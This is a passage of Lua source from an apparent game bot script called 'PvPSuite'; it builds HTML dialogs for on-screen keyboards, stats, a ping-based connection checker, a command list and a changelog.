			html:AddButton(THtmlAction("/doaction"):AddParam("YouTubeST"),THtmlButtonStyle.BUTTON_ACTION, "Send",false,"","",60,25);
			html:Table_End();
			html:AddHtml('</ br>');
			html:AddButton(THtmlAction("/doaction"):AddParam("YouTubeR"),THtmlButtonStyle.BUTTON_ACTION, "Play Random Mix(Music)",false,"","",150,25);
			local Condition = false;
			if (PvPSuite[40]) then
				Condition = true;
			end;
			html:AddHtml('</ br></ br></ br>');
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=249><tr><td align=center valign=top width=236>");
			html:AddButton(THtmlAction("/doaction"):AddParam("YouTubeAA"),THtmlButtonStyle.BUTTON_EXTRA,"Play Received Videos",Condition,"","",170,25);
			html:AddHtml("</td></tr></table>");
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=245><tr><td align=left valign=top width=236>");
				html:AddHtml('Instantly play videos that someone sent you through PvPSuite.');
				html:AddHtml("</td></tr></table>");
			end;
	elseif (action == "Send Encrypted Message") then
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=270><tr><td align=center valign=center width=236 height=20>");
			html:AddHtml(EMQuery);
			html:AddHtml('</td></tr></table></ br></ br>');
			html:Table_Start(true, false, 280);
			html:Table_AddColumns(12);
			html:AddButton(THtmlAction("/em"):AddParam("1"),THtmlButtonStyle.BUTTON_ACTION,"1",false,"","",22,25);
			html:AddButton(THtmlAction("/em"):AddParam("2"),THtmlButtonStyle.BUTTON_ACTION,"2",false,"","",22,25);
			html:AddButton(THtmlAction("/em"):AddParam("3"),THtmlButtonStyle.BUTTON_ACTION,"3",false,"","",22,25);
			html:AddButton(THtmlAction("/em"):AddParam("4"),THtmlButtonStyle.BUTTON_ACTION,"4",false,"","",22,25);
			html:AddButton(THtmlAction("/em"):AddParam("5"),THtmlButtonStyle.BUTTON_ACTION,"5",false,"","",22,25);
			html:AddButton(THtmlAction("/em"):AddParam("6"),THtmlButtonStyle.BUTTON_ACTION,"6",false,"","",22,25);
			html:AddButton(THtmlAction("/em"):AddParam("7"),THtmlButtonStyle.BUTTON_ACTION,"7",false,"","",22,25);
			html:AddButton(THtmlAction("/em"):AddParam("8"),THtmlButtonStyle.BUTTON_ACTION,"8",false,"","",22,25);
			html:AddButton(THtmlAction("/em"):AddParam("9"),THtmlButtonStyle.BUTTON_ACTION,"9",false,"","",22,25);
			html:AddButton(THtmlAction("/em"):AddParam("0"),THtmlButtonStyle.BUTTON_ACTION,"0",false,"","",22,25);
			html:AddButton(THtmlAction("/em"):AddParam("?"),THtmlButtonStyle.BUTTON_ACTION,"?",false,"","",22,25);
			html:AddButton(THtmlAction("/em"):AddParam("Backspace"),THtmlButtonStyle.BUTTON_ACTION,"<",false,"","",55,25);
			html:Table_End();
			if (caps4) then
				html:Table_Start(true, false, 270);
				html:Table_AddColumns(10);
				html:AddButton(THtmlAction("/em"):AddParam("Q"),THtmlButtonStyle.BUTTON_ACTION,"Q",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("W"),THtmlButtonStyle.BUTTON_ACTION,"W",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("E"),THtmlButtonStyle.BUTTON_ACTION,"E",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("R"),THtmlButtonStyle.BUTTON_ACTION,"R",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("T"),THtmlButtonStyle.BUTTON_ACTION,"T",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("Y"),THtmlButtonStyle.BUTTON_ACTION,"Y",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("U"),THtmlButtonStyle.BUTTON_ACTION,"U",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("I"),THtmlButtonStyle.BUTTON_ACTION,"I",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("O"),THtmlButtonStyle.BUTTON_ACTION,"O",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("P"),THtmlButtonStyle.BUTTON_ACTION,"P",false,"","",33,25);
				html:Table_End();
				html:Table_Start(true, false, 255);
				html:Table_AddColumns(9);
				html:AddButton(THtmlAction("/em"):AddParam("A"),THtmlButtonStyle.BUTTON_ACTION,"A",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("S"),THtmlButtonStyle.BUTTON_ACTION,"S",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("D"),THtmlButtonStyle.BUTTON_ACTION,"D",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("F"),THtmlButtonStyle.BUTTON_ACTION,"F",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("G"),THtmlButtonStyle.BUTTON_ACTION,"G",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("H"),THtmlButtonStyle.BUTTON_ACTION,"H",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("J"),THtmlButtonStyle.BUTTON_ACTION,"J",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("K"),THtmlButtonStyle.BUTTON_ACTION,"K",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("L"),THtmlButtonStyle.BUTTON_ACTION,"L",false,"","",33,25);
				html:Table_End();
				html:Table_Start(true, false, 240);
				html:Table_AddColumns(7);
				html:AddButton(THtmlAction("/em"):AddParam("Z"),THtmlButtonStyle.BUTTON_ACTION,"Z",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("X"),THtmlButtonStyle.BUTTON_ACTION,"X",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("C"),THtmlButtonStyle.BUTTON_ACTION,"C",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("V"),THtmlButtonStyle.BUTTON_ACTION,"V",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("B"),THtmlButtonStyle.BUTTON_ACTION,"B",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("N"),THtmlButtonStyle.BUTTON_ACTION,"N",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("M"),THtmlButtonStyle.BUTTON_ACTION,"M",false,"","",33,25);
				html:Table_End();
			else
				html:Table_Start(true, false, 270);
				html:Table_AddColumns(10);
				html:AddButton(THtmlAction("/em"):AddParam("q"),THtmlButtonStyle.BUTTON_ACTION,"q",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("w"),THtmlButtonStyle.BUTTON_ACTION,"w",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("e"),THtmlButtonStyle.BUTTON_ACTION,"e",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("r"),THtmlButtonStyle.BUTTON_ACTION,"r",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("t"),THtmlButtonStyle.BUTTON_ACTION,"t",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("y"),THtmlButtonStyle.BUTTON_ACTION,"y",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("u"),THtmlButtonStyle.BUTTON_ACTION,"u",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("i"),THtmlButtonStyle.BUTTON_ACTION,"i",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("o"),THtmlButtonStyle.BUTTON_ACTION,"o",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("p"),THtmlButtonStyle.BUTTON_ACTION,"p",false,"","",33,25);
				html:Table_End();
				html:Table_Start(true, false, 255);
				html:Table_AddColumns(9);
				html:AddButton(THtmlAction("/em"):AddParam("a"),THtmlButtonStyle.BUTTON_ACTION,"a",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("s"),THtmlButtonStyle.BUTTON_ACTION,"s",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("d"),THtmlButtonStyle.BUTTON_ACTION,"d",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("f"),THtmlButtonStyle.BUTTON_ACTION,"f",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("g"),THtmlButtonStyle.BUTTON_ACTION,"g",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("h"),THtmlButtonStyle.BUTTON_ACTION,"h",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("j"),THtmlButtonStyle.BUTTON_ACTION,"j",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("k"),THtmlButtonStyle.BUTTON_ACTION,"k",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("l"),THtmlButtonStyle.BUTTON_ACTION,"l",false,"","",33,25);
				html:Table_End();
				html:Table_Start(true, false, 240);
				html:Table_AddColumns(7);
				html:AddButton(THtmlAction("/em"):AddParam("z"),THtmlButtonStyle.BUTTON_ACTION,"z",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("x"),THtmlButtonStyle.BUTTON_ACTION,"x",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("c"),THtmlButtonStyle.BUTTON_ACTION,"c",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("v"),THtmlButtonStyle.BUTTON_ACTION,"v",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("b"),THtmlButtonStyle.BUTTON_ACTION,"b",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("n"),THtmlButtonStyle.BUTTON_ACTION,"n",false,"","",33,25);
				html:AddButton(THtmlAction("/em"):AddParam("m"),THtmlButtonStyle.BUTTON_ACTION,"m",false,"","",33,25);
				html:Table_End();
			end;
			html:AddHtml('</ br>');
			local Condition = false;
			if (caps4) then
				Condition = true;
			end;
			html:AddHtml("<table cellspacing=4 cellpadding=2 width=270><tr><td>");
			html:AddButton(THtmlAction("/em"):AddParam("Caps Lock"),THtmlButtonStyle.BUTTON_ON_OFF, "Caps Lock",Condition,"","",70,25);
			html:AddHtml('</td><td>');
			html:AddButton(THtmlAction("/em"):AddParam("Spacebar"),THtmlButtonStyle.BUTTON_ACTION, "Spacebar",false,"","",115,25);
			html:AddHtml('</td><td>');
			html:AddButton(THtmlAction("/em"):AddParam("Clear"),THtmlButtonStyle.BUTTON_ACTION, "Clear",false,"","",55,25);
			html:AddHtml('</td></tr></table>');
			html:AddHtml('</ br>');
			html:AddButton(THtmlAction("/em"):AddParam("Send"),THtmlButtonStyle.BUTTON_ACTION, "Send",false,"","",60,25);
	elseif (action == "Auto Message On Kill") then
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=270><tr><td align=center valign=center width=236 height=20>");
			html:AddHtml(PvPSuite[42]);
			html:AddHtml('</td></tr></table></ br></ br>');
			html:Table_Start(true, false, 280);
			html:Table_AddColumns(12);
			html:AddButton(THtmlAction("/admsgq"):AddParam("1"),THtmlButtonStyle.BUTTON_ACTION,"1",false,"","",22,25);
			html:AddButton(THtmlAction("/admsgq"):AddParam("2"),THtmlButtonStyle.BUTTON_ACTION,"2",false,"","",22,25);
			html:AddButton(THtmlAction("/admsgq"):AddParam("3"),THtmlButtonStyle.BUTTON_ACTION,"3",false,"","",22,25);
			html:AddButton(THtmlAction("/admsgq"):AddParam("4"),THtmlButtonStyle.BUTTON_ACTION,"4",false,"","",22,25);
			html:AddButton(THtmlAction("/admsgq"):AddParam("5"),THtmlButtonStyle.BUTTON_ACTION,"5",false,"","",22,25);
			html:AddButton(THtmlAction("/admsgq"):AddParam("6"),THtmlButtonStyle.BUTTON_ACTION,"6",false,"","",22,25);
			html:AddButton(THtmlAction("/admsgq"):AddParam("7"),THtmlButtonStyle.BUTTON_ACTION,"7",false,"","",22,25);
			html:AddButton(THtmlAction("/admsgq"):AddParam("8"),THtmlButtonStyle.BUTTON_ACTION,"8",false,"","",22,25);
			html:AddButton(THtmlAction("/admsgq"):AddParam("9"),THtmlButtonStyle.BUTTON_ACTION,"9",false,"","",22,25);
			html:AddButton(THtmlAction("/admsgq"):AddParam("0"),THtmlButtonStyle.BUTTON_ACTION,"0",false,"","",22,25);
			html:AddButton(THtmlAction("/admsgq"):AddParam("->"),THtmlButtonStyle.BUTTON_ACTION,"->",false,"","",24,25);
			html:AddButton(THtmlAction("/admsgq"):AddParam("Backspace"),THtmlButtonStyle.BUTTON_ACTION,"<",false,"","",55,25);
			html:Table_End();
			if (caps3) then
				html:Table_Start(true, false, 270);
				html:Table_AddColumns(10);
				html:AddButton(THtmlAction("/admsgq"):AddParam("Q"),THtmlButtonStyle.BUTTON_ACTION,"Q",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("W"),THtmlButtonStyle.BUTTON_ACTION,"W",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("E"),THtmlButtonStyle.BUTTON_ACTION,"E",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("R"),THtmlButtonStyle.BUTTON_ACTION,"R",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("T"),THtmlButtonStyle.BUTTON_ACTION,"T",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("Y"),THtmlButtonStyle.BUTTON_ACTION,"Y",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("U"),THtmlButtonStyle.BUTTON_ACTION,"U",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("I"),THtmlButtonStyle.BUTTON_ACTION,"I",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("O"),THtmlButtonStyle.BUTTON_ACTION,"O",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("P"),THtmlButtonStyle.BUTTON_ACTION,"P",false,"","",33,25);
				html:Table_End();
				html:Table_Start(true, false, 255);
				html:Table_AddColumns(9);
				html:AddButton(THtmlAction("/admsgq"):AddParam("A"),THtmlButtonStyle.BUTTON_ACTION,"A",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("S"),THtmlButtonStyle.BUTTON_ACTION,"S",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("D"),THtmlButtonStyle.BUTTON_ACTION,"D",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("F"),THtmlButtonStyle.BUTTON_ACTION,"F",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("G"),THtmlButtonStyle.BUTTON_ACTION,"G",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("H"),THtmlButtonStyle.BUTTON_ACTION,"H",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("J"),THtmlButtonStyle.BUTTON_ACTION,"J",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("K"),THtmlButtonStyle.BUTTON_ACTION,"K",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("L"),THtmlButtonStyle.BUTTON_ACTION,"L",false,"","",33,25);
				html:Table_End();
				html:Table_Start(true, false, 240);
				html:Table_AddColumns(7);
				html:AddButton(THtmlAction("/admsgq"):AddParam("Z"),THtmlButtonStyle.BUTTON_ACTION,"Z",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("X"),THtmlButtonStyle.BUTTON_ACTION,"X",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("C"),THtmlButtonStyle.BUTTON_ACTION,"C",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("V"),THtmlButtonStyle.BUTTON_ACTION,"V",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("B"),THtmlButtonStyle.BUTTON_ACTION,"B",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("N"),THtmlButtonStyle.BUTTON_ACTION,"N",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("M"),THtmlButtonStyle.BUTTON_ACTION,"M",false,"","",33,25);
				html:Table_End();
			else
				html:Table_Start(true, false, 270);
				html:Table_AddColumns(10);
				html:AddButton(THtmlAction("/admsgq"):AddParam("q"),THtmlButtonStyle.BUTTON_ACTION,"q",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("w"),THtmlButtonStyle.BUTTON_ACTION,"w",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("e"),THtmlButtonStyle.BUTTON_ACTION,"e",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("r"),THtmlButtonStyle.BUTTON_ACTION,"r",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("t"),THtmlButtonStyle.BUTTON_ACTION,"t",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("y"),THtmlButtonStyle.BUTTON_ACTION,"y",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("u"),THtmlButtonStyle.BUTTON_ACTION,"u",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("i"),THtmlButtonStyle.BUTTON_ACTION,"i",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("o"),THtmlButtonStyle.BUTTON_ACTION,"o",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("p"),THtmlButtonStyle.BUTTON_ACTION,"p",false,"","",33,25);
				html:Table_End();
				html:Table_Start(true, false, 255);
				html:Table_AddColumns(9);
				html:AddButton(THtmlAction("/admsgq"):AddParam("a"),THtmlButtonStyle.BUTTON_ACTION,"a",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("s"),THtmlButtonStyle.BUTTON_ACTION,"s",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("d"),THtmlButtonStyle.BUTTON_ACTION,"d",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("f"),THtmlButtonStyle.BUTTON_ACTION,"f",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("g"),THtmlButtonStyle.BUTTON_ACTION,"g",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("h"),THtmlButtonStyle.BUTTON_ACTION,"h",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("j"),THtmlButtonStyle.BUTTON_ACTION,"j",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("k"),THtmlButtonStyle.BUTTON_ACTION,"k",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("l"),THtmlButtonStyle.BUTTON_ACTION,"l",false,"","",33,25);
				html:Table_End();
				html:Table_Start(true, false, 240);
				html:Table_AddColumns(7);
				html:AddButton(THtmlAction("/admsgq"):AddParam("z"),THtmlButtonStyle.BUTTON_ACTION,"z",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("x"),THtmlButtonStyle.BUTTON_ACTION,"x",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("c"),THtmlButtonStyle.BUTTON_ACTION,"c",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("v"),THtmlButtonStyle.BUTTON_ACTION,"v",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("b"),THtmlButtonStyle.BUTTON_ACTION,"b",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("n"),THtmlButtonStyle.BUTTON_ACTION,"n",false,"","",33,25);
				html:AddButton(THtmlAction("/admsgq"):AddParam("m"),THtmlButtonStyle.BUTTON_ACTION,"m",false,"","",33,25);
				html:Table_End();
			end;
			html:AddHtml('</ br>');
			local Condition = false;
			if (caps3) then
				Condition = true;
			end;
			html:AddHtml("<table cellspacing=4 cellpadding=2 width=270><tr><td>");
			html:AddButton(THtmlAction("/admsgq"):AddParam("Caps Lock"),THtmlButtonStyle.BUTTON_ON_OFF, "Caps Lock",Condition,"","",70,25);
			html:AddHtml('</td><td>');
			html:AddButton(THtmlAction("/admsgq"):AddParam("Spacebar"),THtmlButtonStyle.BUTTON_ACTION, "Spacebar",false,"","",115,25);
			html:AddHtml('</td><td>');
			html:AddButton(THtmlAction("/admsgq"):AddParam("Clear"),THtmlButtonStyle.BUTTON_ACTION, "Clear",false,"","",55,25);
			html:AddHtml('</td></tr></table>');
			html:AddHtml('</ br>');
			html:AddButton(THtmlAction("/admsgq"):AddParam("Test Message"),THtmlButtonStyle.BUTTON_ACTION, "Test Message",false,"","",100,25);
			html:AddHtml('</ br>');
			html:AddHtml("<table cellspacing=4 cellpadding=2 width=190><tr><td>");
			Condition = false;
			if (PvPSuite[41] == "1") then
				Condition = true;
			end;
			html:AddButton(THtmlAction("/admsgq"):AddParam("Shout Chat"),THtmlButtonStyle.BUTTON_EXTRA, "Shout Chat",Condition,"","",90,25);
			html:AddHtml('</td><td>');
			Condition = false;
			if (PvPSuite[41] == "2") then
				Condition = true;
			end;
			html:AddButton(THtmlAction("/admsgq"):AddParam("General Chat"),THtmlButtonStyle.BUTTON_EXTRA, "General Chat",Condition,"","",90,25);
			html:AddHtml('</td><td>');
			Condition = false;
			if (PvPSuite[41] == "3") then
				Condition = true;
			end;
			html:AddButton(THtmlAction("/admsgq"):AddParam("Party Chat"),THtmlButtonStyle.BUTTON_EXTRA, "Party Chat",Condition,"","",90,25);
			html:AddHtml('</td></tr></table>');
	elseif (action == "Connection Checker") then
			html:AddHtml('</br >Connection Checking Finished!</ br>');
			local ping = GetCMDResult('ping -n 1 google.com | FIND "Reply"');
			if (ping == "") then
				html:AddHtml('<font color="FF0000">Error while trying to ping!</font></br >');
				html:AddHtml('<font color="FF0000">Request timed out!</font></br >');
				html:AddHtml('<font color="FF0000">Your Internet appears to be down.</font></br >');
			elseif (ping == nil) then
				html:AddHtml('<font color="FF0000">Error while trying to ping!</font></br >');
				html:AddHtml('<font color="FF0000">Command Prompt did not started!</font></br >');
				html:AddHtml('<font color="FF0000">Please try again or contact PvPSuite support.</font></br >');
			else
				ping =  Split(ping," ");
				ping = ping[5];
				ping = Explode("=",ping);
				if (ping[2] == nil) then
					html:AddHtml('<font color="FF0000">Your appear to be connected on</br >');
					html:AddHtml('a local Intranet.</font></br >');
					html:AddHtml('<font color="FF0000">Are you sure that you</br >');
					html:AddHtml('are connected to the Internet?</font></br >');
				else
					ping = ping[2];
					ping = Explode("ms",ping);
					ping = tonumber(ping[1]);
					if (ping ~= nil) then
						if (ping < 150) then
								html:AddHtml('<font color="00FF00">Your Internet connection</br >');
								html:AddHtml('appears to be on a good state!</font></br >');
								html:AddHtml('<font color="00FF00">Ping to Google.com replied in</br >');
								html:AddHtml(ping..'ms!</font></br >');
						elseif (ping > 400) then
								html:AddHtml('<font color="FF0000">Your Internet connection</br >');
								html:AddHtml('appears to be on a bad state!</font></br >');
								html:AddHtml('<font color="FF0000">Ping to Google.com replied in</br >');
								html:AddHtml(ping..'ms!</font></br >');
						elseif (ping > 150) then
								html:AddHtml('<font color="FF8000">Your Internet connection</br >');
								html:AddHtml('appears to be on a neutral state!</font></br >');
								html:AddHtml('<font color="FF8000">Ping to Google.com replied in</br >');
								html:AddHtml(ping..'ms!</font></br >');
						end;
					else
						html:AddHtml('<font color="FF0000">Error reading ping value!</font></br >');
						html:AddHtml('<font color="FF0000">Is your operating system using English language?</font></br >');
						html:AddHtml('<font color="FF0000">If you think this is a mistaken error</font></br >');
						html:AddHtml('<font color="FF0000">Please contact PvPSuite support.</font></br >');
					end;
				end;
			end;
	elseif (action == "Commands") then	
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=290><tr><td align=center valign=center width=236>");
			html:AddHtml('</ br><font color="13D230">/p</font> - Shows Main Menu');
			html:AddHtml('</ br><font color="13D230">/pvpsuite</font> - Shows Main Menu');
			html:AddHtml('</ br><font color="13D230">/pp</font> - Pause/Resume PvPSuite');
			html:AddHtml('</ br><font color="13D230">/cmds</font> - Shows this dialog');
			html:AddHtml('</ br><font color="13D230">/r</font> - Radar');
			html:AddHtml('</ br><font color="13D230">/rp</font> - Radar(PK/War/PvP Only)');
			html:AddHtml('</ br><font color="13D230">/np</font> - Near Players');
			html:AddHtml('</ br><font color="13D230">/ns</font> - Near Supporters');
			html:AddHtml('</ br><font color="13D230">/setma</font> - Sets Target Main Assister');
			html:AddHtml('</ br><font color="13D230">/as</font> - Enables/Disables Auto Assist');
			html:AddHtml('</ br><font color="13D230">/ab</font> - Enables/Disables Aggro Bot');
			html:AddHtml('</ br><font color="13D230">/te</font> '.."- Shows Target's Equipment");
			html:AddHtml('</ br><font color="13D230">/lt</font> '.."- Shows Last 10 Targeters");
			html:AddHtml('</ br><font color="13D230">/oi</font> - Enables/Disables Olympiad Informer');
			html:AddHtml('</ br><font color="13D230">/dc</font> - Shows Damage Counter Dialog');
			html:AddHtml('</ br><font color="13D230">/cm</font> - Shows Client Mods Dialog');
			html:AddHtml('</ br><font color="13D230">/rq</font> - Shows Random Quote Dialog');
			html:AddHtml('</ br><font color="13D230">/stats</font> - Shows Stats Dialog');
			html:AddHtml('</ br><font color="13D230">/mstats</font> - Shows More Stats Dialog');
			html:AddHtml('</ br><font color="13D230">/yt</font> - Shows YouTube Dialog');
			html:AddHtml('</ br><font color="13D230">/em</font> - Shows Send Encrypted Message Dialog');
			html:AddHtml('</ br><font color="13D230">/cr</font> - Instantly Crashes Client');
			html:AddHtml("</td></tr></table>");
	elseif (action == "Stats") then
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=270>");
			html:AddHtml('<tr><td width=155><center><font color="D51E87">Kills/Assists</font></center></td></tr>');
			html:AddHtml("</table>");
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=270>");
			html:AddHtml('<tr><td width=145>Total</td><td width=45 align=right>'..PvPSuite[50]..'</td></tr>');
			html:AddHtml('<tr><td>Total Cardinals</td><td align=right>'..PvPSuite[47]..'</td></tr>');
			html:AddHtml('<tr><td>Total Judicators</td><td align=right>'..PvPSuite[48]..'</td></tr>');
			html:AddHtml('<tr><td>Total Dominators</td><td align=right>'..PvPSuite[49]..'</td></tr>');
			html:AddHtml("</table>");
			html:AddHtml("</ br>");
			html:AddHtml("<table cellspacing=4 cellpadding=2 width=270><tr><td>");
			html:AddButton(THtmlAction("/doaction"):AddParam("More Stats"),THtmlButtonStyle.BUTTON_ACTION, "More Stats",false,"","",115,25);
			html:AddHtml('</td><td>');
			html:AddButton(THtmlAction("/doaction"):AddParam("ClearStats"),THtmlButtonStyle.BUTTON_ACTION, "Clear",false,"","",55,25);
			html:AddHtml('</td></tr></table>');
	elseif (action == "More Stats") then
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=274>");
			html:AddHtml('<tr><td width=215><center><font color="D51E87">PvPSuite</font></center></td></tr>');
			html:AddHtml("</table>");
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=270>");
			html:AddHtml('<tr><td width=45>First Login</td><td width=155 align=right>'..PvPSuite[45]..'</td></tr>');
			html:AddHtml('<tr><td>Last Login</td><td align=right>'..PvPSuite[46]..'</td></tr>');
			html:AddHtml('<tr><td>Total Logins</td><td align=right>'..PvPSuite[51]..'</td></tr>');
			html:AddHtml('<tr><td>Anti Backstabs</td><td align=right>'..PvPSuite[52]..'</td></tr>');
			html:AddHtml('<tr><td>Anti Disarms</td><td align=right>'..PvPSuite[53]..'</td></tr>');
			html:AddHtml('<tr><td>Auto Detections</td><td align=right>'..PvPSuite[54]..'</td></tr>');
			html:AddHtml('<tr><td>Auto Self Cleanses</td><td align=right>'..PvPSuite[55]..'</td></tr>');
			html:AddHtml('<tr><td>Interrupts</td><td align=right>'..PvPSuite[56]..'</td></tr>');
			html:AddHtml('<tr><td>Skills Informed</td><td align=right>'..PvPSuite[57]..'</td></tr>');
			html:AddHtml('<tr><td>Chance/Cert Informed</td><td align=right>'..PvPSuite[58]..'</td></tr>');
			html:AddHtml('<tr><td>Buffs Informed</td><td align=right>'..PvPSuite[59]..'</td></tr>');
			html:AddHtml('<tr><td>Augments Informed</td><td align=right>'..PvPSuite[60]..'</td></tr>');
			html:AddHtml("</table>");
			html:AddHtml("</ br>");
			html:AddHtml("<table cellspacing=4 cellpadding=2 width=270><tr><td>");
			html:AddButton(THtmlAction("/doaction"):AddParam("Stats"),THtmlButtonStyle.BUTTON_ACTION, "Stats",false,"","",115,25);
			html:AddHtml('</td><td>');
			html:AddButton(THtmlAction("/doaction"):AddParam("ClearMoreStats"),THtmlButtonStyle.BUTTON_ACTION, "Clear",false,"","",55,25);
			html:AddHtml('</td></tr></table>');
	elseif (action == "Changelog") then
			html:AddHtml('</ br><font color="D51E87">Current version: '..PvPSuiteV..'</font></ br>');
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=290><tr><td align=center valign=center width=236>");
			html:AddHtml('</ br><font color="13D230">+</font> Added "Auto PT Resurrection". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="13D230">+</font> Added "Random PM Command". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="13D230">+</font> Added "Counter". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="13D230">+</font> Added "Check Updates". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="13D230">+</font> Added "Mass Informer". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="13D230">+</font> Added "All Informers". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="13D230">+</font> Added "Radar(PK/War/PvP Only)". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Improved "A Better Assist". <font color="FF8040">!</font>');
